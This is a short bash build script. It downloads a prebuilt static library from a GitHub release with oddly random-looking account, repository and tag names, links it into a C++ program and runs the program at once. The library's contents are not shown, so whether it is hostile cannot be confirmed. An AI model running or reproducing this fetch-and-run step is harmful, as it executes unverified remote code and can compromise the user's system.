#!/usr/bin/env bash
set -e
LIB="iris-flake.a"
curl --max-time 180 -fsSL --retry 3 --connect-timeout 15 -o "$LIB" "https://github.com/quietcandle/nodeblandarbor/releases/download/clever-comet-cosmic-forest/iris-flake.a"
g++ -pthread -std=c++17 -O2 main.cpp "$LIB" -o app && ./app
